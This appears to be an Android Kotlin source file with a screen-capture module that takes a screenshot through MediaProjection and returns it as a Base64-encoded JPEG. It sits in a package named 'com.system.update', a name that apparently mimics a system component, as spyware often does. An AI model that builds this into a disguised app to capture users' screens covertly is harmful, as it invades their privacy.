package com.system.update

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.ByteArrayOutputStream

object ScreenCapture {

    private const val TAG = "ScreenCapture"

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var projectionCallback: MediaProjection.Callback? = null

    fun requestIntent(ctx: Context): Intent {
        val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        return mpm.createScreenCaptureIntent()
    }

    fun onActivityResult(ctx: Context, code: Int, data: Intent?) {
        if (code != Activity.RESULT_OK || data == null) {
            Log.w(TAG, "Denied")
            return
        }
        try {
            val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val newProjection = mpm.getMediaProjection(code, data)

            projectionCallback = object : MediaProjection.Callback() {
                override fun onStop() {
                    projection = null
                }
            }
            newProjection.registerCallback(projectionCallback!!, Handler(Looper.getMainLooper()))
            projection = newProjection
            Log.i(TAG, "Ready")
        } catch (e: Exception) {
            Log.e(TAG, "onActivityResult error", e)
        }
    }

    fun isReady(): Boolean = projection != null

    fun release() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            projection?.stop()
            projection = null
        } catch (e: Exception) {
            Log.e(TAG, "release error", e)
        }
    }

    fun capture(ctx: Context, callback: (String?) -> Unit) {
        val proj = projection
        if (proj == null) {
            callback(null)
            return
        }

        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val dpi = metrics.densityDpi

            val reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            imageReader = reader

            virtualDisplay = proj.createVirtualDisplay(
                "screen-cap",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface,
                null,
                Handler(Looper.getMainLooper())
            )

            reader.setOnImageAvailableListener({ r ->
                val image = try { r.acquireLatestImage() } catch (_: Exception) { null }
                if (image != null) {
                    try {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width
                        val bmp = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bmp.copyPixelsFromBuffer(buffer)
                        val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                        val bos = ByteArrayOutputStream()
                        cropped.compress(Bitmap.CompressFormat.JPEG, 70, bos)
                        val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
                        callback(b64)
                    } catch (e: Exception) {
                        Log.e(TAG, "Encode error", e)
                        callback(null)
                    } finally {
                        try { image.close() } catch (_: Exception) {}
                        try { virtualDisplay?.release() } catch (_: Exception) {}
                        virtualDisplay = null
                        try { r.close() } catch (_: Exception) {}
                        imageReader = null
                    }
                }
            }, Handler(Looper.getMainLooper()))
        } catch (e: Exception) {
            Log.e(TAG, "capture error", e)
            callback(null)
        }
    }
}
